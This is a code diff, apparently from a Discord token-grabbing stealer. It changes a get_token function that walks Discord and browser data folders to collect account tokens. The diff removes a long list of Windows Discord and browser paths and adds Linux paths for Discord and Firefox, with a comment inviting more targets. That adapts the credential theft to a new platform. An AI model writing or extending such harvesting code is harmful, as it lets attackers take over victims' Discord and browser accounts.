@@ -27,35 +27,12 @@ def getip():
 
 def get_token():
     already_check = []
-    checker = []
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    chrome = local + "/Google/Chrome/User Data/Default"
     paths = {
-        'Discord': roaming + '/discord',
-        'Discord Canary': roaming + '/discordcanary',
-        'Lightcord': roaming + '/Lightcord',
-        'Discord PTB': roaming + '/discordptb',
-        'Opera': roaming + '/Opera Software/Opera Stable',
-        'Opera GX': roaming + '/Opera Software/Opera GX Stable',
-        'Amigo': local + '/Amigo/User Data',
-        'Torch': local + '/Torch/User Data',
-        'Kometa': local + '/Kometa/User Data',
-        'Orbitum': local + '/Orbitum/User Data',
-        'CentBrowser': local + '/CentBrowser/User Data',
-        '7Star': local + '/7Star/7Star/User Data',
-        'Sputnik': local + '/Sputnik/Sputnik/User Data',
-        'Vivaldi': local + '/Vivaldi/User Data/Default',
-        'Chrome SxS': local + '/Google/Chrome SxS/User Data',
-        'Chrome': chrome,
-        'Epic Privacy Browser': local + '/Epic Privacy Browser/User Data',
-        'Microsoft Edge': local + '/Microsoft/Edge/User Data/Default',
-        'Uran': local + '/uCozMedia/Uran/User Data/Default',
-        'Yandex': local + '/Yandex/YandexBrowser/User Data/Default',
-        'Brave': local + '/BraveSoftware/Brave-Browser/User Data/Default',
-        'Iridium': local + '/Iridium/User Data/Default'
+        'Discord': os.path.expanduser('~/.config/discord'),
+        'Firefox': os.path.expanduser('~/.mozilla/firefox'),
+        # Add other paths as per your requirements
     }
-    
+
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
